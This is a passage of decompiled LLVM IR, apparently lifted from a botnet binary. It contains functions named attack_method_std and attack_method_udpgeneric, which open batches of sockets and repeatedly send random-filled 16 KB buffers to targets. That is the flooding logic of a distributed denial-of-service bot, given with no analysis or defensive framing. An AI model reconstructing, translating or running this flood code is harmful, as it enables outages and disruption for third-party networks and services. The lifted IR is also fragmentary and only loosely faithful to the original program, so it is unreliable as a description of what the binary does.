  store i32 0, i32* @fp, align 4
  %v3_8b4c = udiv i32 %v3_8a00, 256
  %v1_8b48 = mul i32 %v5_89f8, 256
  %v4_8b50 = and i32 %v1_8b48, 65280
  %v5_8b50 = or i32 %v4_8b50, %v3_8b4c
  %v2_8ad0 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_8b30

dec_label_pc_8ab0:                                ; preds = %bb51, %dec_label_pc_8b70
  %v3_8abc = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_8ac4 = icmp eq i32 %v3_8abc, -1
  %v0_8ac8 = load i32, i32* @sb, align 4
  %v1_8ac8 = add i32 %v0_8ac8, 1
  store i32 %v1_8ac8, i32* @sb, align 4
  %v0_8acc = load i32, i32* @fp, align 4
  %v1_8acc = add i32 %v0_8acc, 24
  store i32 %v1_8acc, i32* @fp, align 4
  %v2_8ad8 = load i32, i32* @r8, align 4
  %v3_8ad8 = add i32 %v2_8ad8, %stack_var_-60.0
  %v4_8ad8 = inttoptr i32 %v3_8ad8 to i32*
  store i32 %v3_8abc, i32* %v4_8ad8, align 4
  br i1 %v7_8ac4, label %dec_label_pc_8bcc, label %dec_label_pc_8ae0

dec_label_pc_8ae0:                                ; preds = %dec_label_pc_8ab0
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_8af8 = call i32 @bind(i32 %v3_8abc, i32 %v2_8ad0, i32 16)
  %v0_8afc = load i32, i32* @r6, align 4
  %v1_8afc = add i32 %v0_8afc, 20
  %v2_8afc = inttoptr i32 %v1_8afc to i8*
  %v3_8afc = load i8, i8* %v2_8afc, align 1
  %v4_8afc = zext i8 %v3_8afc to i32
  store i32 %v4_8afc, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8afc, 32
  br i1 %tmp, label %dec_label_pc_8b84, label %dec_label_pc_8b08

dec_label_pc_8b08:                                ; preds = %dec_label_pc_8ae0, %dec_label_pc_8b84
  %v0_8b0c = phi i32 [ %v0_8afc, %dec_label_pc_8ae0 ], [ %v0_8b0c.pre, %dec_label_pc_8b84 ]
  %v1_8b10 = load i32, i32* @r8, align 4
  %v2_8b10 = add i32 %v1_8b10, %stack_var_-60.0
  %v3_8b10 = inttoptr i32 %v2_8b10 to i32*
  %v4_8b10 = load i32, i32* %v3_8b10, align 4
  %v3_8b18 = call i32 @__libc_connect(i32 %v4_8b10, i32 %v0_8b0c, i32 16)
  %v0_8b20 = load i32, i32* @sb, align 4
  %v1_8b20 = load i32, i32* @r7, align 4
  %v9_8b20 = icmp eq i32 %v0_8b20, %v1_8b20
  %v1_8b24 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8b24, i32* %r3.global-to-local, align 4
  br i1 %v9_8b20, label %dec_label_pc_8bd8, label %dec_label_pc_8b30

dec_label_pc_8b30:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8aa0
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8aa0 ], [ %v1_8b24, %dec_label_pc_8b08 ]
  store i32 65535, i32* @r4, align 4
  %v2_8b40 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_8b50, i32* %r3.global-to-local, align 4
  %v1_8b5c = load i32, i32* @r4, align 4
  %v9_8b5c = icmp eq i32 %v3_8a00, %v1_8b5c
  %v1_8b60 = load i32, i32* @fp, align 4
  %v2_8b60 = add i32 %v1_8b60, %arg2
  store i32 %v2_8b60, i32* @r6, align 4
  %v2_8b64 = load i32, i32* @sl, align 4
  %v3_8b64 = add i32 %v2_8b64, %stack_var_-60.0
  %v4_8b64 = inttoptr i32 %v3_8b64 to i32*
  store i32 %v2_8b40, i32* %v4_8b64, align 4
  br i1 %v9_8b5c, label %dec_label_pc_8b70, label %bb51

bb51:                                             ; preds = %dec_label_pc_8b30
  %v1_8b68 = load i32, i32* %r3.global-to-local, align 4
  %v2_8b68 = trunc i32 %v1_8b68 to i16
  %v3_8b68 = load i32, i32* @r6, align 4
  %v4_8b68 = add i32 %v3_8b68, 2
  %v5_8b68 = inttoptr i32 %v4_8b68 to i16*
  store i16 %v2_8b68, i16* %v5_8b68, align 2
  br label %dec_label_pc_8ab0

dec_label_pc_8b70:                                ; preds = %dec_label_pc_8b30
  %v0_8b70 = call i32 @rand_next()
  %v1_8b70 = trunc i32 %v0_8b70 to i16
  %v0_8b78 = load i32, i32* @fp, align 4
  %v2_8b78 = add i32 %v0_8b78, %arg2
  store i32 %v2_8b78, i32* @r6, align 4
  %v4_8b7c = add i32 %v2_8b78, 2
  %v5_8b7c = inttoptr i32 %v4_8b7c to i16*
  store i16 %v1_8b70, i16* %v5_8b7c, align 2
  br label %dec_label_pc_8ab0

dec_label_pc_8b84:                                ; preds = %dec_label_pc_8ae0
  %v1_8b84 = add i32 %v0_8afc, 16
  %v2_8b84 = inttoptr i32 %v1_8b84 to i32*
  %v3_8b84 = load i32, i32* %v2_8b84, align 4
  store i32 %v3_8b84, i32* @r4, align 4
  %v0_8b88 = call i32 @rand_next()
  %v0_8b8c = load i32, i32* @r4, align 4
  %v1_8b98 = and i32 %v0_8b8c, 65280
  store i32 %v1_8b98, i32* %r3.global-to-local, align 4
  %v0_8ba0 = load i32, i32* @r6, align 4
  %v1_8ba0 = add i32 %v0_8ba0, 20
  %v2_8ba0 = inttoptr i32 %v1_8ba0 to i8*
  %v3_8ba0 = load i8, i8* %v2_8ba0, align 1
  %v4_8ba0 = zext i8 %v3_8ba0 to i32
  %v5_8ba4 = call i32 @llvm.bswap.i32(i32 %v0_8b8c)
  %v7_8ba8 = lshr i32 %v0_8b88, %v4_8ba0
  %v8_8ba8 = add i32 %v7_8ba8, %v5_8ba4
  %v5_8bc0 = call i32 @llvm.bswap.i32(i32 %v8_8ba8)
  store i32 %v5_8bc0, i32* %r3.global-to-local, align 4
  %v2_8bc4 = add i32 %v0_8ba0, 4
  %v3_8bc4 = inttoptr i32 %v2_8bc4 to i32*
  store i32 %v5_8bc0, i32* %v3_8bc4, align 4
  %v0_8b0c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8b08

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_8ab0
  store i32 %v18_89ac, i32* %sb.global-to-local, align 4
  ret i32 %v3_8abc

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8a98
  %v1_8c1822 = phi i32 [ 0, %dec_label_pc_8a98 ], [ %v0_8b20, %dec_label_pc_8b08 ]
  %v2_8bdc = icmp eq i32 %v0_8a7c10, 0
  br i1 %v2_8bdc, label %dec_label_pc_8bfc.outer, label %dec_label_pc_8c14

dec_label_pc_8bec:                                ; preds = %dec_label_pc_8bfc
  store i32 %v1_8bf0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8bec = load i32, i32* @r8, align 4
  %v4_8bec = mul i32 %v1_8bf0, 4
  %v5_8bec = add i32 %v0_8bec, %v4_8bec
  %v6_8bec = inttoptr i32 %v5_8bec to i32*
  %v7_8bec = load i32, i32* %v6_8bec, align 4
  %v0_8bf0 = load i32, i32* @sl, align 4
  %v5_8bf0 = add i32 %v0_8bf0, %v4_8bec
  %v6_8bf0 = inttoptr i32 %v5_8bf0 to i32*
  %v7_8bf0 = load i32, i32* %v6_8bf0, align 4
  %v4_8bf4 = call i32 @__libc_send(i32 %v7_8bec, i32 %v7_8bf0, i32 %v0_8c00, i32 16384)
  %v0_8bf8 = load i32, i32* @r4, align 4
  %v1_8bf8 = add i32 %v0_8bf8, 1
  %v0_8bfc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8bfc.outer

dec_label_pc_8bfc.outer:                          ; preds = %dec_label_pc_8bd8, %dec_label_pc_8bec
  %v0_8bfc.ph = phi i32 [ %v0_8bfc.pre.pre, %dec_label_pc_8bec ], [ %v1_8c1822, %dec_label_pc_8bd8 ]
  %v1_8bf0.ph = phi i32 [ %v1_8bf8, %dec_label_pc_8bec ], [ 0, %dec_label_pc_8bd8 ]
  %v0_8c00 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8bfc

dec_label_pc_8bfc:                                ; preds = %dec_label_pc_8bfc.outer, %dec_label_pc_8bfc
  %v1_8bf0 = phi i32 [ 0, %dec_label_pc_8bfc ], [ %v1_8bf0.ph, %dec_label_pc_8bfc.outer ]
  %v8_8c08 = icmp sgt i32 %v0_8bfc.ph, %v1_8bf0
  br i1 %v8_8c08, label %dec_label_pc_8bec, label %dec_label_pc_8bfc

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c18, %dec_label_pc_8bd8
  %v1_8c1821 = phi i32 [ %v1_8c1822, %dec_label_pc_8bd8 ], [ %v1_8c18, %dec_label_pc_8c18 ]
  br label %dec_label_pc_8c18

dec_label_pc_8c18:                                ; preds = %dec_label_pc_8c24, %dec_label_pc_8c14
  %v1_8c18 = phi i32 [ %v1_8c1821, %dec_label_pc_8c14 ], [ %v1_8c18.pre, %dec_label_pc_8c24 ]
  %v1_8c24 = phi i32 [ 0, %dec_label_pc_8c14 ], [ %v1_8c44, %dec_label_pc_8c24 ]
  store i32 %v1_8c24, i32* @r6, align 4
  %v6_8c20 = icmp slt i32 %v1_8c24, %v1_8c18
  br i1 %v6_8c20, label %dec_label_pc_8c24, label %dec_label_pc_8c14

dec_label_pc_8c24:                                ; preds = %dec_label_pc_8c18
  %v0_8c1c = load i32, i32* @r5, align 4
  %v0_8c24 = load i32, i32* @sl, align 4
  %v4_8c24 = mul i32 %v1_8c24, 4
  %v5_8c24 = add i32 %v0_8c24, %v4_8c24
  %v6_8c24 = inttoptr i32 %v5_8c24 to i32*
  %v7_8c24 = load i32, i32* %v6_8c24, align 4
  store i32 %v7_8c24, i32* @r4, align 4
  %v2_8c2c = inttoptr i32 %v7_8c24 to i16*
  %v3_8c2c = call i32 @rand_str(i16* %v2_8c2c, i32 %v0_8c1c)
  %v0_8c30 = load i32, i32* @r8, align 4
  %v1_8c30 = load i32, i32* @r6, align 4
  %v4_8c30 = mul i32 %v1_8c30, 4
  %v5_8c30 = add i32 %v4_8c30, %v0_8c30
  %v6_8c30 = inttoptr i32 %v5_8c30 to i32*
  %v7_8c30 = load i32, i32* %v6_8c30, align 4
  %v0_8c34 = load i32, i32* @r4, align 4
  %v0_8c38 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8c40 = call i32 @__libc_send(i32 %v7_8c30, i32 %v0_8c34, i32 %v0_8c38, i32 16384)
  %v0_8c44 = load i32, i32* @r6, align 4
  %v1_8c44 = add i32 %v0_8c44, 1
  %v1_8c18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8c18

; uselistorder directives
  uselistorder i32 %v1_8c18, { 1, 0 }
  uselistorder i32 %v1_8bf0, { 2, 1, 0 }
  uselistorder i32 %v5_8bc0, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8afc, { 1, 0, 2 }
  uselistorder i32 %v3_8abc, { 1, 3, 2, 0 }
  uselistorder i32 %v3_8a50, { 1, 0 }
  uselistorder i32 %v3_8a00, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8b08, { 1, 0 }
  uselistorder label %dec_label_pc_8ab0, { 1, 0 }
  uselistorder label %dec_label_pc_8a98, { 1, 0 }
}

define i32 @attack_method_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_8c4c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8c68 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_8c68, i32* @sl, align 4
  %v0_8c74 = load i32, i32* @r7, align 4
  %v2_8c78 = call i32 @calloc(i32 %v0_8c74, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_8c84 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_8c78, i32* @r8, align 4
  %v0_8c94 = load i32, i32* @r5, align 4
  %v4_8c98 = inttoptr i32 %v0_8c84 to i32*
  %v5_8c98 = call i32 @attack_get_opt_int(i32 %v0_8c94, i32* %v4_8c98, i32 7, i32 65535)
  %v3_8ca0 = urem i32 %v5_8c98, 65536
  %v0_8ca4 = load i32, i32* @r6, align 4
  %v0_8cac = load i32, i32* @r4, align 4
  store i32 %v0_8cac, i32* %r3.global-to-local, align 4
  %v0_8cb0 = load i32, i32* @r5, align 4
  %v5_8cb8 = inttoptr i32 %v0_8ca4 to i32*
  %v6_8cb8 = call i32 @attack_get_opt_int(i32 %v0_8cb0, i32* %v5_8cb8, i32 6, i32 %v0_8cac)
  %v0_8cbc = load i32, i32* @r6, align 4
  %v3_8cc0 = mul i32 %v6_8cb8, 65536
  store i32 %v3_8cc0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_8ccc = load i32, i32* @r5, align 4
  %v4_8cd0 = inttoptr i32 %v0_8cbc to i32*
  %v5_8cd0 = call i32 @attack_get_opt_int(i32 %v0_8ccc, i32* %v4_8cd0, i32 0, i32 1024)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8ce0 = load i32, i32* @r6, align 4
  %v0_8ce4 = load i32, i32* @r5, align 4
  %v3_8ce8 = urem i32 %v5_8cd0, 65536
  store i32 %v3_8ce8, i32* @r5, align 4
  %v4_8cec = inttoptr i32 %v0_8ce0 to i32*
  %v5_8cec = call i32 @attack_get_opt_int(i32 %v0_8ce4, i32* %v4_8cec, i32 1, i32 1)
  %v0_8cf0 = load i32, i32* %sb.global-to-local, align 4
  %v3_8cf0 = udiv i32 %v0_8cf0, 65536
  store i32 %v3_8cf0, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8cf8 = load i32, i32* @r4, align 4
  %v9_8cf8 = icmp eq i32 %v3_8cf0, %v1_8cf8
  br i1 %v9_8cf8, label %dec_label_pc_8d28, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_8d10 = udiv i32 %v0_8cf0, 16777216
  store i32 %v4_8d10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d38

dec_label_pc_8d28:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_8d28 = call i32 @rand_next()
  br label %dec_label_pc_8d38

dec_label_pc_8d38:                                ; preds = %bb, %dec_label_pc_8d28
  %v0_8d1c10 = urem i32 %v5_8cec, 256
  %v0_8d38 = load i32, i32* @r7, align 4
  %v2_8d38 = icmp eq i32 %v0_8d38, 0
  br i1 %v2_8d38, label %dec_label_pc_8e78, label %dec_label_pc_8d40

dec_label_pc_8d40:                                ; preds = %dec_label_pc_8d38
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8dec = udiv i32 %v3_8ca0, 256
  %v1_8de8 = mul i32 %v5_8c98, 256
  %v4_8df0 = and i32 %v1_8de8, 65280
  %v5_8df0 = or i32 %v4_8df0, %v3_8dec
  %v2_8d70 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_8dd0

dec_label_pc_8d50:                                ; preds = %bb51, %dec_label_pc_8e10
  %v3_8d5c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_8d64 = icmp eq i32 %v3_8d5c, -1
  %v0_8d68 = load i32, i32* @sb, align 4
  %v1_8d68 = add i32 %v0_8d68, 1
  store i32 %v1_8d68, i32* @sb, align 4
  %v0_8d6c = load i32, i32* @fp, align 4
  %v1_8d6c = add i32 %v0_8d6c, 24
  store i32 %v1_8d6c, i32* @fp, align 4
  %v2_8d78 = load i32, i32* @r8, align 4
  %v3_8d78 = add i32 %v2_8d78, %stack_var_-60.0
  %v4_8d78 = inttoptr i32 %v3_8d78 to i32*
  store i32 %v3_8d5c, i32* %v4_8d78, align 4
  br i1 %v7_8d64, label %dec_label_pc_8e6c, label %dec_label_pc_8d80

dec_label_pc_8d80:                                ; preds = %dec_label_pc_8d50
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_8d98 = call i32 @bind(i32 %v3_8d5c, i32 %v2_8d70, i32 16)
  %v0_8d9c = load i32, i32* @r6, align 4
  %v1_8d9c = add i32 %v0_8d9c, 20
  %v2_8d9c = inttoptr i32 %v1_8d9c to i8*
  %v3_8d9c = load i8, i8* %v2_8d9c, align 1
  %v4_8d9c = zext i8 %v3_8d9c to i32
  store i32 %v4_8d9c, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8d9c, 32
  br i1 %tmp, label %dec_label_pc_8e24, label %dec_label_pc_8da8

dec_label_pc_8da8:                                ; preds = %dec_label_pc_8d80, %dec_label_pc_8e24
  %v0_8dac = phi i32 [ %v0_8d9c, %dec_label_pc_8d80 ], [ %v0_8dac.pre, %dec_label_pc_8e24 ]
  %v1_8db0 = load i32, i32* @r8, align 4
  %v2_8db0 = add i32 %v1_8db0, %stack_var_-60.0
  %v3_8db0 = inttoptr i32 %v2_8db0 to i32*
  %v4_8db0 = load i32, i32* %v3_8db0, align 4
  %v3_8db8 = call i32 @__libc_connect(i32 %v4_8db0, i32 %v0_8dac, i32 16)
  %v0_8dc0 = load i32, i32* @sb, align 4
  %v1_8dc0 = load i32, i32* @r7, align 4
  %v9_8dc0 = icmp eq i32 %v0_8dc0, %v1_8dc0
  %v1_8dc4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8dc4, i32* %r3.global-to-local, align 4
  br i1 %v9_8dc0, label %dec_label_pc_8e78, label %dec_label_pc_8dd0

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8da8, %dec_label_pc_8d40
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8d40 ], [ %v1_8dc4, %dec_label_pc_8da8 ]
  store i32 65535, i32* @r4, align 4
  %v2_8de0 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_8df0, i32* %r3.global-to-local, align 4
  %v1_8dfc = load i32, i32* @r4, align 4
  %v9_8dfc = icmp eq i32 %v3_8ca0, %v1_8dfc
  %v1_8e00 = load i32, i32* @fp, align 4
  %v2_8e00 = add i32 %v1_8e00, %arg2
  store i32 %v2_8e00, i32* @r6, align 4
  %v2_8e04 = load i32, i32* @sl, align 4
  %v3_8e04 = add i32 %v2_8e04, %stack_var_-60.0
  %v4_8e04 = inttoptr i32 %v3_8e04 to i32*
  store i32 %v2_8de0, i32* %v4_8e04, align 4
  br i1 %v9_8dfc, label %dec_label_pc_8e10, label %bb51

bb51:                                             ; preds = %dec_label_pc_8dd0
  %v1_8e08 = load i32, i32* %r3.global-to-local, align 4
  %v2_8e08 = trunc i32 %v1_8e08 to i16
  %v3_8e08 = load i32, i32* @r6, align 4
  %v4_8e08 = add i32 %v3_8e08, 2
  %v5_8e08 = inttoptr i32 %v4_8e08 to i16*
  store i16 %v2_8e08, i16* %v5_8e08, align 2
  br label %dec_label_pc_8d50

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8dd0
  %v0_8e10 = call i32 @rand_next()
  %v1_8e10 = trunc i32 %v0_8e10 to i16
  %v0_8e18 = load i32, i32* @fp, align 4
  %v2_8e18 = add i32 %v0_8e18, %arg2
  store i32 %v2_8e18, i32* @r6, align 4
  %v4_8e1c = add i32 %v2_8e18, 2
  %v5_8e1c = inttoptr i32 %v4_8e1c to i16*
  store i16 %v1_8e10, i16* %v5_8e1c, align 2
  br label %dec_label_pc_8d50

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8d80
  %v1_8e24 = add i32 %v0_8d9c, 16
  %v2_8e24 = inttoptr i32 %v1_8e24 to i32*
  %v3_8e24 = load i32, i32* %v2_8e24, align 4
  store i32 %v3_8e24, i32* @r4, align 4
  %v0_8e28 = call i32 @rand_next()
  %v0_8e2c = load i32, i32* @r4, align 4
  %v1_8e38 = and i32 %v0_8e2c, 65280
  store i32 %v1_8e38, i32* %r3.global-to-local, align 4
  %v0_8e40 = load i32, i32* @r6, align 4
  %v1_8e40 = add i32 %v0_8e40, 20
  %v2_8e40 = inttoptr i32 %v1_8e40 to i8*
  %v3_8e40 = load i8, i8* %v2_8e40, align 1
  %v4_8e40 = zext i8 %v3_8e40 to i32
  %v5_8e44 = call i32 @llvm.bswap.i32(i32 %v0_8e2c)
  %v7_8e48 = lshr i32 %v0_8e28, %v4_8e40
  %v8_8e48 = add i32 %v7_8e48, %v5_8e44
  %v5_8e60 = call i32 @llvm.bswap.i32(i32 %v8_8e48)
  store i32 %v5_8e60, i32* %r3.global-to-local, align 4
  %v2_8e64 = add i32 %v0_8e40, 4
  %v3_8e64 = inttoptr i32 %v2_8e64 to i32*
  store i32 %v5_8e60, i32* %v3_8e64, align 4
  %v0_8dac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8da8

dec_label_pc_8e6c:                                ; preds = %dec_label_pc_8d50
  store i32 %v18_8c4c, i32* %sb.global-to-local, align 4
  ret i32 %v3_8d5c

dec_label_pc_8e78:                                ; preds = %dec_label_pc_8da8, %dec_label_pc_8d38
  %v1_8eb822 = phi i32 [ 0, %dec_label_pc_8d38 ], [ %v0_8dc0, %dec_label_pc_8da8 ]
  %v2_8e7c = icmp eq i32 %v0_8d1c10, 0
  br i1 %v2_8e7c, label %dec_label_pc_8e9c.outer, label %dec_label_pc_8eb4

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e9c
  store i32 %v1_8e90, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8e8c = load i32, i32* @r8, align 4
  %v4_8e8c = mul i32 %v1_8e90, 4
  %v5_8e8c = add i32 %v0_8e8c, %v4_8e8c
  %v6_8e8c = inttoptr i32 %v5_8e8c to i32*
  %v7_8e8c = load i32, i32* %v6_8e8c, align 4
  %v0_8e90 = load i32, i32* @sl, align 4
  %v5_8e90 = add i32 %v0_8e90, %v4_8e8c
  %v6_8e90 = inttoptr i32 %v5_8e90 to i32*
  %v7_8e90 = load i32, i32* %v6_8e90, align 4
  %v4_8e94 = call i32 @__libc_send(i32 %v7_8e8c, i32 %v7_8e90, i32 %v0_8ea0, i32 16384)
  %v0_8e98 = load i32, i32* @r4, align 4
  %v1_8e98 = add i32 %v0_8e98, 1
  %v0_8e9c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e9c.outer

dec_label_pc_8e9c.outer:                          ; preds = %dec_label_pc_8e78, %dec_label_pc_8e8c
  %v0_8e9c.ph = phi i32 [ %v0_8e9c.pre.pre, %dec_label_pc_8e8c ], [ %v1_8eb822, %dec_label_pc_8e78 ]
  %v1_8e90.ph = phi i32 [ %v1_8e98, %dec_label_pc_8e8c ], [ 0, %dec_label_pc_8e78 ]
  %v0_8ea0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8e9c

dec_label_pc_8e9c:                                ; preds = %dec_label_pc_8e9c.outer, %dec_label_pc_8e9c
  %v1_8e90 = phi i32 [ 0, %dec_label_pc_8e9c ], [ %v1_8e90.ph, %dec_label_pc_8e9c.outer ]
  %v8_8ea8 = icmp sgt i32 %v0_8e9c.ph, %v1_8e90
  br i1 %v8_8ea8, label %dec_label_pc_8e8c, label %dec_label_pc_8e9c

dec_label_pc_8eb4:                                ; preds = %dec_label_pc_8eb8, %dec_label_pc_8e78
  %v1_8eb821 = phi i32 [ %v1_8eb822, %dec_label_pc_8e78 ], [ %v1_8eb8, %dec_label_pc_8eb8 ]
  br label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8ec4, %dec_label_pc_8eb4
  %v1_8eb8 = phi i32 [ %v1_8eb821, %dec_label_pc_8eb4 ], [ %v1_8eb8.pre, %dec_label_pc_8ec4 ]
  %v1_8ec4 = phi i32 [ 0, %dec_label_pc_8eb4 ], [ %v1_8ee4, %dec_label_pc_8ec4 ]
  store i32 %v1_8ec4, i32* @r6, align 4
  %v6_8ec0 = icmp slt i32 %v1_8ec4, %v1_8eb8
  br i1 %v6_8ec0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb4

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8eb8
  %v0_8ebc = load i32, i32* @r5, align 4
  %v0_8ec4 = load i32, i32* @sl, align 4
  %v4_8ec4 = mul i32 %v1_8ec4, 4
  %v5_8ec4 = add i32 %v0_8ec4, %v4_8ec4
  %v6_8ec4 = inttoptr i32 %v5_8ec4 to i32*
  %v7_8ec4 = load i32, i32* %v6_8ec4, align 4
  store i32 %v7_8ec4, i32* @r4, align 4
  %v2_8ecc = inttoptr i32 %v7_8ec4 to i16*
  %v3_8ecc = call i32 @rand_str(i16* %v2_8ecc, i32 %v0_8ebc)
  %v0_8ed0 = load i32, i32* @r8, align 4
  %v1_8ed0 = load i32, i32* @r6, align 4
  %v4_8ed0 = mul i32 %v1_8ed0, 4
  %v5_8ed0 = add i32 %v4_8ed0, %v0_8ed0
  %v6_8ed0 = inttoptr i32 %v5_8ed0 to i32*
  %v7_8ed0 = load i32, i32* %v6_8ed0, align 4
  %v0_8ed4 = load i32, i32* @r4, align 4
  %v0_8ed8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8ee0 = call i32 @__libc_send(i32 %v7_8ed0, i32 %v0_8ed4, i32 %v0_8ed8, i32 16384)
  %v0_8ee4 = load i32, i32* @r6, align 4
  %v1_8ee4 = add i32 %v0_8ee4, 1
  %v1_8eb8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8eb8

; uselistorder directives
  uselistorder i32 %v1_8eb8, { 1, 0 }
  uselistorder i32 %v1_8e90, { 2, 1, 0 }
  uselistorder i32 %v5_8e60, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8d9c, { 1, 0, 2 }
  uselistorder i32 %v3_8d5c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_8cf0, { 1, 0 }
  uselistorder i32 %v3_8ca0, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8e9c, { 1, 0 }
  uselistorder label %dec_label_pc_8e9c.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8da8, { 1, 0 }
  uselistorder label %dec_label_pc_8d50, { 1, 0 }
  uselistorder label %dec_label_pc_8d38, { 1, 0 }
}

define i32 @attack_method_udpgeneric(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_8eec = load i32, i32* @sb, align 4
  %v27_8eec = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8f08 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_8f0c = load i32, i32* @r5, align 4
  store i32 %v0_8f0c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f1c = load i32, i32* @r4, align 4
  store i32 %v0_8f1c, i32* %r0.global-to-local, align 4
  %v5_8f20 = inttoptr i32 %v0_8f0c to i32*
  %v6_8f20 = call i32 @attack_get_opt_int(i32 %v0_8f1c, i32* %v5_8f20, i32 2, i32 0)
  %v1_8f2c = urem i32 %v6_8f20, 256
  store i32 %v1_8f2c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_8f38 = load i32, i32* @r5, align 4
  store i32 %v0_8f38, i32* %r1.global-to-local, align 4
  %v0_8f3c = load i32, i32* @r4, align 4
  store i32 %v0_8f3c, i32* %r0.global-to-local, align 4
  %v5_8f40 = trunc i32 %v6_8f20 to i8
  %v6_8f44 = inttoptr i32 %v0_8f38 to i32*
  %v7_8f44 = call i32 @attack_get_opt_int(i32 %v0_8f3c, i32* %v6_8f44, i32 3, i32 65535)
  %v0_8f48 = load i32, i32* @r5, align 4
  store i32 %v0_8f48, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_8f58 = load i32, i32* @r4, align 4
  store i32 %v0_8f58, i32* %r0.global-to-local, align 4
